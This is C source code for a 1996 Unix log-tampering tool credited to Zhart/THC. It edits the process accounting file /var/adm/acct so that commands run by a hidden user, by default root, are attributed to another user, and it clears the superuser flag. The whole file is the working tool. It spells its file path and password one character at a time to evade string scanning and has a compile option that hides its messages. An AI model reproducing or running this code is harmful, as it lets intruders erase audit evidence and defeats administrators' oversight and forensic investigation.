/* #### ACCT Handler v1.0 beta #### 
   #### By Zhart/THC  (c) 1996 #### */

#define LINUX

#include <stdio.h> 
#include <sys/types.h> 
#include <sys/file.h> 
#include <unistd.h> 
#ifdef LINUX
#include <linux/acct.h>
#else 
#include <sys/acct.h>
#endif
#include <time.h>
#include <pwd.h>
#include <strings.h> 
#include <signal.h>
#include <fcntl.h>

#define SHOW    /* Comment this line if don't want explicit evil messages */
                  /* compiled with the program (to protect from "strings") */

#define PWD 0   /* Set it to 1 to ask for a password in interactive mode */
                               /* and not showing help from command line */

#define STEPS  500   /* Number of steps to go back in fast search */
#define COUNTD 20    /* CountDown seconds (for mask mode) */

int u_uid=0;         /* Default uid of user to hide */
int f_uid=3;         /* Default uid of user to show */
char p_name[16];     /* Program to assign to fake_user */ 
int b_flag=0;           /* Beginning (no date) flag */
int m_flag=0;           /* CountDown Mask Mode flag */
char filename[30];      /* acct logging file */


int vWd ()
/* validatePwd - verifies program password */
{
char word[10];
char token[10];
word[0] = 'z';
word[1] = 'h';
word[2] = 'a';
word[3] = 'r';
word[4] = 't';
word[5] = '\0';

scanf ("%s",token);
if (strcmp(token,word)) return(0);
else return(1);
}


void usage()
{
#ifdef SHOW
if (!PWD) {
  printf("\nUsage: <progname> -u user -f user [-t time]/[-b] [-p command] [-m] [-h]\n"); 
  printf("-u user_login     (necessary) User to hide\n");
  printf("-f user_login     (necessary) User to fake\n");
  printf("-t hh:mm dd/mm/yy (if not -b) Start editing from this date\n");
  printf("-b                (if not -t) Start editing from file's beginning\n");
  printf("-p command_name    (optional) Fake user only about this command\n");
  printf("-m                 (optional) CountDown Mask mode\n");
  printf("-h                            This help\n");
  printf("If NO arguments are given program acts in interactive mode\n\n");
  }
#endif
}

int vUsr(char *name)
/* verifyUser - returns the uid of a user's login name */
{
struct passwd *pwt;

if((pwt = getpwnam(name)) != NULL)
  return(pwt->pw_uid);
else {
#ifdef SHOW  
printf ("Error: %s is not a valid user\n",name);
#endif
  exit(1);
  }
}

int readParams(char *args[],int ac,long *i)
{
struct tm t;
int x;

if (ac==1) return(0);
else for(x = 1; x < ac; x++) {
  if(args[x][0] == '-')
    switch(args[x][1]) {
      case 'u':                         /* username to hide */
                if((x + 1) < ac)
                   u_uid=vUsr(args[++x]);
                break;
                
      case 'f':                        /* fake user to be shown */
                if((x + 1) < ac)
                   f_uid=vUsr(args[++x]);        
                break;

      case 't':                        /* date since start scanning */ 
                if((x + 2) < ac)
		   sscanf(args[++x],"%d:%d",&(t.tm_hour),&(t.tm_min));
                   sscanf(args[++x],"%d/%d/%d",&(t.tm_mday),&(t.tm_mon),&(t.tm_year));
                   t.tm_sec=0;
                   (t.tm_mon)--;
                   t.tm_wday=0;
                   t.tm_yday=0;
                   t.tm_isdst=0;
                   *i=mktime(&t);
#ifdef SHOW                   
                   printf ("\nInput time has been interpreted as: %.24s\n",ctime(i));
#endif
                break;

      case 'b': 
                b_flag=1;
                break;
      
      case 'p':
                if((x+1) < ac)      
                  strcpy(p_name,args[++x]);
                break;
      
      case 'h':  
                usage();
                exit(1);

      case 'm':
                m_flag=1;
                break;
      }
  }
return(1);
}

void readDate (long *i)
/* Reads date and returns it in UTC (seconds) */
/* Interactive mode */
{
struct tm t;
printf("Please type time,day,month,year  Ex: 13:15 27/10/83\n --> "); 
scanf("%d:%d %d/%d/%d",
&(t.tm_hour),&(t.tm_min),
&(t.tm_mday),&(t.tm_mon),&(t.tm_year));
t.tm_sec=0;
(t.tm_mon)--;
t.tm_wday=6;
t.tm_yday=0;
t.tm_isdst=0;

*i=mktime(&t); 
printf ("Input time has been interpreted as: %.24s\n",ctime(i));
}

void rUsrs()
/* readUsers - Interactive mode */
{
char u_name[16];
char f_name[16];
#ifdef SHOW
printf("\nName of user to hide:");
#endif
printf("\n --> ");
scanf("%s",u_name);
u_uid=vUsr(u_name);
#ifdef SHOW
printf("\nName of user to show:");
#endif
printf("\n --> ");
scanf("%s",f_name);
f_uid=vUsr(f_name);
}

void Interactive(long *u_date)
{
char answer[16];
if (PWD) if (!vWd()) exit(1);
startEnd();
if (PWD) getchar();
printf ("Start from beginning? [y/N]: ");
if (getchar()=='y') b_flag=1;
  else readDate(u_date);
rUsrs();
/* readProg */
getchar();
printf ("\nSpecify command? [y/N]: ");
if (getchar()=='y') {
  printf(" ==> ");
  scanf("%s",answer);
  strcpy(p_name,answer);
  }
}


int startEnd()
/* Prints dates of first and last log */
{
struct acct actbuf;
int fd;
long endtime;

#ifdef SHOW
printf ("\n########   ACCT Handler by Zhart (c) 1996   ########\n");
#endif
/* Open acct file in read-only mode*/
if((fd = open(filename,O_RDONLY)) == -1 )
  return(-1);

/* read the buffer */
if(read(fd,(char *)&actbuf,sizeof(actbuf)) != sizeof(actbuf)) {
    (void)close(fd);
    return(0);
    }

endtime=actbuf.ac_btime+actbuf.ac_etime;
printf("\nFile starts at:  %.24s\n",ctime(&endtime));

/* GotoENd */
if(lseek(fd,(long)(-sizeof(actbuf)),SEEK_END) < 0) {
      (void)close(fd);
      return(0);
      }

/* Read the buffer */
if(read(fd,(char *)&actbuf,sizeof(actbuf)) != sizeof(actbuf)) {
    (void)close(fd);
    return(0);
    }

endtime=actbuf.ac_btime+actbuf.ac_etime;
printf("File ends at:    %.24s\n\n",ctime(&endtime));
(void)close(fd);
}


int reachFast (int fd,long u_date)
{
struct acct actbuf;
int found=0;
long endtime;

/* Set offset to end of file */
if(lseek(fd,(long)(-sizeof(actbuf)),SEEK_END) < 0) {
      (void)close(fd);
      return(0);
      }

while (!found) {

  /* Read the buffer */
  if(read(fd,(char *)&actbuf,sizeof(actbuf)) != sizeof(actbuf)) {
    (void)close(fd);
    return(0);
    }
  /* Verify date */
  endtime=actbuf.ac_btime+actbuf.ac_etime;
  if (endtime < u_date) found=1;
  else 
    /* Go down of STEPS lines <------ */
    if(lseek(fd,(long)(-(STEPS*sizeof(actbuf))),SEEK_CUR) < 0) {
      (void)close(fd);
      return(0);
      }
  }
printf ("Date reached (fast): %.24s\n",ctime(&endtime));
}

int reachSlow (int fd,long u_date)
{
struct acct actbuf;
int found=0;
long endtime;

while (!found) {

  /* Read the buffer */
  if(read(fd,(char *)&actbuf,sizeof(actbuf)) != sizeof(actbuf)) {
    (void)close(fd);
    return(0);
    }
  /* Verify date */
  endtime=actbuf.ac_btime+actbuf.ac_etime;
  if (u_date<=endtime) found=1;
  }
printf ("Date reached (slow): %.24s\n",ctime(&endtime));
}


int verifyA (struct acct actbuf)
/* verifyAct - Verifies if acct record must be edited */
{
/* return(actbuf.ac_uid==u_uid); */
if (actbuf.ac_uid==u_uid) 
  if (p_name[0]=='\0') return(1);
  else if (!strcmp(p_name,actbuf.ac_comm)) return (1);
return(0);
} 


int editA(int fd,struct acct actbuf)
/* editAct - */
{
printf("#");
fflush(stdout);
actbuf.ac_uid = f_uid;
actbuf.ac_flag &= ~ASU;
if(lseek(fd,(long)(-sizeof(actbuf)),1) < 0) {
  (void)close(fd);
  return(0);
  }
if(write(fd,(char *)&actbuf,sizeof(actbuf)) != sizeof(actbuf)) {
  (void)close(fd);
  return(0);
  }
}


int scanA (int fd)
/* scanACCT - */
{
struct acct actbuf;
#ifdef SHOW
printf ("Scanning data ...\n");
#endif
while (1) { 
  /* read buffer*/
  if(read(fd,(char *)&actbuf,sizeof(actbuf)) != sizeof(actbuf)) {
      (void)close(fd);
      return(0);
      }
  /* verify criteria matching and (eventually) start editing */
  if (verifyA(actbuf)) editA(fd,actbuf);
  } 
}



main(int argc,char *argv[])
{
long u_date;
int fd;

filename[0]='/';
filename[1]='v';
filename[2]='a';
filename[3]='r';
filename[4]='/';
filename[5]='a';
filename[6]='d';
filename[7]='m';
filename[8]='/';
filename[9]='a';
filename[10]='c';
filename[11]='c';
filename[12]='t';
filename[13]='\0';

if (!readParams(argv,argc,&u_date)) Interactive(&u_date);
else startEnd();
if (m_flag) {
  setuid(0);
  sleep(COUNTD);
  }

/* Should insert a date validation */

#ifdef SHOW
printf ("\nHiding user id: %d Showing user id: %d\n",u_uid,f_uid);
#endif

/* Open ACCT file in read/write mode */ 
if((fd = open(filename,O_RDWR)) == -1 )
  return(-1);
if (!b_flag) { 
  reachFast(fd,u_date);
  reachSlow(fd,u_date);
  }
scanA(fd);
(void)close(fd);
printf("\n");
}
